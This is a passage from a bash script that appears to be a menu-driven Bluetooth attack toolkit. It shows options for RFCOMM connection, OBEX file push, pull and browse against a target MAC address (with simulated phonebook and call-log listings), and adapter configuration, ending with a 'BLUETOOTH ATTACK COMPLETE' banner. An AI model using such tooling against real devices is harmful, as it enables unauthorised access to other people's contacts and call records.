            echo "OK"
            echo -e "${DIM}> ATI${RESET}"
            echo "Manufacturer: Test Device"
        else
            if command -v rfcomm &> /dev/null; then
                rfcomm connect hci0 "$TARGET_MAC" "$CHANNEL"
            fi
        fi
        ;;
    
    17) # OBEX Transfer
        echo -e "${CYAN}[*]${RESET} OBEX File Transfer"
        echo ""
        
        read -p "$(echo -e ${WHITE}'  [>] Target MAC: '${RESET})" TARGET_MAC
        [ -z "$TARGET_MAC" ] && TARGET_MAC="AA:BB:CC:DD:EE:FF"
        
        echo -e "${DIM}  Operations:${RESET}"
        echo -e "    ${DIM}1) Push file${RESET}"
        echo -e "    ${DIM}2) Pull file${RESET}"
        echo -e "    ${DIM}3) Browse${RESET}"
        read -p "$(echo -e ${WHITE}'  [>] Select [1]: '${RESET})" OBEX_OP
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            case $OBEX_OP in
                1|"")
                    read -p "$(echo -e ${WHITE}'  [>] File to push: '${RESET})" PUSH_FILE
                    echo -e "${YELLOW}[*]${RESET} Pushing file..."
                    sleep 1
                    echo -e "${GREEN}[+]${RESET} File sent successfully!"
                    ;;
                2)
                    echo -e "${YELLOW}[*]${RESET} Listing remote files..."
                    echo "  contacts.vcf"
                    echo "  calendar.ics"
                    echo "  notes.txt"
                    ;;
                3)
                    echo -e "${YELLOW}[*]${RESET} Browsing..."
                    echo "/ (root)"
                    echo "├── telecom/"
                    echo "│   ├── pb.vcf (phonebook)"
                    echo "│   └── ich.vcf (incoming calls)"
                    echo "└── internal/"
                    ;;
            esac
        else
            if command -v obexftp &> /dev/null; then
                obexftp -b "$TARGET_MAC" -l
            fi
        fi
        ;;
    
    18) # Interface Setup
        echo -e "${CYAN}[*]${RESET} Bluetooth Interface Configuration"
        echo ""
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo -e "${GREEN}━━━ Current Configuration ━━━${RESET}"
            echo ""
            echo "hci0:   Type: Primary  Bus: USB"
            echo "        BD Address: AA:BB:CC:DD:EE:FF  ACL MTU: 1021:8"
            echo "        UP RUNNING PSCAN ISCAN"
            echo "        RX bytes:1234 acl:56 sco:0 events:89 errors:0"
            echo "        TX bytes:5678 acl:90 sco:0 commands:12 errors:0"
            echo ""
            echo -e "${DIM}Commands:${RESET}"
            echo "  hciconfig hci0 up      - Enable adapter"
            echo "  hciconfig hci0 down    - Disable adapter"
            echo "  hciconfig hci0 piscan  - Enable discoverable"
            echo "  hciconfig hci0 noscan  - Disable discoverable"
        else
            if command -v hciconfig &> /dev/null; then
                hciconfig -a
            else
                echo -e "${YELLOW}[*]${RESET} Using bluetoothctl..."
                bluetoothctl show
            fi
        fi
        ;;
    
    *) echo -e "${RED}[!] Invalid option${RESET}" ;;
esac

echo ""
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${CYAN}█${RESET}  ${WHITE}BLUETOOTH ATTACK COMPLETE${RESET}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""
